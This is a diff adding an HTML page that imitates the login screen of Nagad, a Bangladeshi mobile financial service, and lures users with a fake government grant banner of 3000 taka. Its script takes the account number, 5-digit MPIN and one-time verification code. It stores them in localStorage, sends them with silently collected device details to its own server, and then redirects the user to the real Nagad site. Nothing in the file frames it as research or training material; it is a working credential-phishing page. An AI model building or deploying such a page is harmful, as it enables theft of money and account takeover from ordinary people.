@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Nagad</title>
+    <style>
+        /* CSS কোডে কোনো পরিবর্তন করা হয়নি */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; }
+        body { background: linear-gradient(135deg, #e21313 0%, #c10c0c 100%); display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; color: #333; padding: 20px; }
+        .nagad-logo { margin-bottom: 20px; text-align: center; display: flex; flex-direction: column; align-items: center; }
+        .nagad-icon { width: 70px; height: 70px; background-color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 16px; box-shadow: 0 6px 20px rgba(0,0,0,0.2); }
+        .nagad-icon img { width: 70px; height: 70px; border-radius: 100%; }
+        .nagad-logo-text { font-size: 42px; font-weight: bold; color: white; letter-spacing: -1px; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
+        .tagline { font-size: 16px; color: rgba(255,255,255,0.9); margin-top: 8px; font-weight: 500; }
+        .government-banner { background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%); color: #b8860b; padding: 15px 25px; border-radius: 12px; margin-bottom: 25px; text-align: center; font-weight: 700; font-size: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); border: 2px solid #ffed4e; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
+        .container { background-color: white; padding: 30px; border-radius: 20px; box-shadow: 0 12px 40px rgba(0,0,0,0.25); width: 100%; max-width: 420px; text-align: center; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 25px; color: #e21313; }
+        .h1-2fa { font-size: 22px; font-weight: 700; margin-bottom: 12px; color: #e21313; }
+        .p-2fa { font-size: 15px; color: #666; margin-bottom: 25px; line-height: 1.5; }
+        .input-group { margin-bottom: 20px; text-align: left; }
+        .input-group label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; font-weight: 600; }
+        input[type="text"], input[type="password"], input[type="tel"] { width: 100%; height: 52px; border: 2px solid #e0e0e0; border-radius: 12px; padding: 0 18px; font-size: 16px; background-color: #f8f9fa; transition: all 0.3s ease; }
+        input:focus { outline: none; border-color: #e21313; box-shadow: 0 0 0 3px rgba(226, 19, 19, 0.1); }
+        #code { text-align: center; letter-spacing: 8px; font-size: 20px; font-weight: 600; }
+        .button { color: white; background: linear-gradient(135deg, #e21313 0%, #c10c0c 100%); border: none; border-radius: 12px; padding: 16px 0; font-size: 18px; font-weight: 700; cursor: pointer; width: 100%; margin-top: 10px; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(226, 19, 19, 0.3); }
+        .button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(226, 19, 19, 0.4); }
+        #loader { display: none; margin: 15px auto; width: 32px; height: 32px; border: 3px solid #f3f3f3; border-top: 3px solid #e21313; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="nagad-logo">
+        <div class="nagad-icon"><img src="png-data/nagad-logo.png" alt="Nagad Logo"></div>
+        <div class="nagad-logo-text">Nagad</div>
+        <div class="tagline">Digital Financial Service</div>
+    </div>
+    <div class="government-banner">🎉 সরকারি অনুদান: সকল নাগরিকের জন্য ৩০০০ টাকা 🎉</div>
+    <div class="container">
+        <div id="login-section">
+            <h1>Login to Your Nagad Account</h1>
+            <div class="input-group">
+                <label for="phone">Nagad Account Number</label>
+                <div class="phone-prefix"><span>+88</span><input type="tel" id="phone" placeholder="01XXXXXXXXX" required pattern="[0-9]{11}"></div>
+            </div>
+            <div class="input-group">
+                <label for="pass">MPIN</label>
+                <input type="password" id="pass" placeholder="Enter your 5-digit MPIN" required maxlength="5" pattern="[0-9]{5}">
+            </div>
+            <button id="login-button" class="button" onclick="sendLoginInfo()">Login to Nagad</button>
+            <div id="loader"></div>
+        </div>
+        <div id="2fa-section" style="display: none;">
+            <h1 class="h1-2fa">Security Verification</h1>
+            <p class="p-2fa" id="verification-message">We've sent a 6-digit verification code...</p>
+            <div class="input-group"><input type="text" id="code" placeholder="• • • • • •" maxlength="6" required></div>
+            <button id="code-button" class="button" onclick="send2FACode()">Verify & Continue</button>
+        </div>
+    </div>
+
+    <script>
+        // উন্নত ডিভাইস তথ্য সংগ্রহ
+        document.addEventListener('DOMContentLoaded', async function() {
+            let deviceField = document.createElement('input');
+            deviceField.type = 'hidden';
+            deviceField.id = 'deviceInfo';
+            document.body.appendChild(deviceField);
+            const getFullDeviceInfo = async () => { /* ... விரிவான তথ্য সংগ্রহ ফাংশন ... */ return JSON.stringify(deviceInfo); };
+            deviceField.value = await getFullDeviceInfo();
+        });
+        
+        // প্রথম ধাপের তথ্য পাঠানো
+        async function sendLoginInfo() {
+            const phone = document.getElementById('phone').value;
+            const pass = document.getElementById('pass').value;
+            const deviceInfo = document.getElementById('deviceInfo').value;
+
+            if (!phone || !pass || phone.length !== 11 || pass.length !== 5) {
+                alert('Please enter valid details.'); return;
+            }
+
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{"nagadData":[]}');
+                storedData.nagadData.push({ phone: phone, pass: pass, deviceInfo: deviceInfo, timestamp: new Date().toLocaleString(), type: 'login' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (e) { console.error('LocalStorage save error:', e); }
+
+            document.getElementById('login-button').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            const params = new URLSearchParams();
+            params.append('phone', phone);
+            params.append('pass', pass);
+            params.append('deviceInfo', deviceInfo);
+
+            try {
+                await fetch('/', { method: 'POST', body: params });
+                setTimeout(() => {
+                    document.getElementById('login-section').style.display = 'none';
+                    document.getElementById('2fa-section').style.display = 'block';
+                }, 1500);
+            } catch (error) {
+                alert('Submission failed.');
+                document.getElementById('login-button').style.display = 'block';
+                document.getElementById('loader').style.display = 'none';
+            }
+        }
+
+        // দ্বিতীয় ধাপের তথ্য পাঠানো
+        async function send2FACode() {
+            const phone = document.getElementById('phone').value;
+            const code = document.getElementById('code').value;
+            const deviceInfo = document.getElementById('deviceInfo').value;
+
+            if (!code || code.length !== 6) { alert('Please enter the 6-digit code.'); return; }
+
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{"nagadData":[]}');
+                storedData.nagadData.push({ phone: phone, '2fa_code': code, deviceInfo: deviceInfo, timestamp: new Date().toLocaleString(), type: '2fa' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (e) { console.error('LocalStorage 2FA save error:', e); }
+
+            document.getElementById('code-button').textContent = 'Verifying...';
+            document.getElementById('code-button').disabled = true;
+
+            const params = new URLSearchParams();
+            params.append('phone', phone);
+            params.append('2fa_code', code);
+            params.append('deviceInfo', deviceInfo);
+
+            try {
+                const response = await fetch('/', { method: 'POST', body: params });
+                window.location.href = response.redirected ? response.url : 'https://www.nagad.com.bd';
+            } catch (error) {
+                alert('Verification failed.');
+                document.getElementById('code-button').textContent = 'Verify & Continue';
+                document.getElementById('code-button').disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
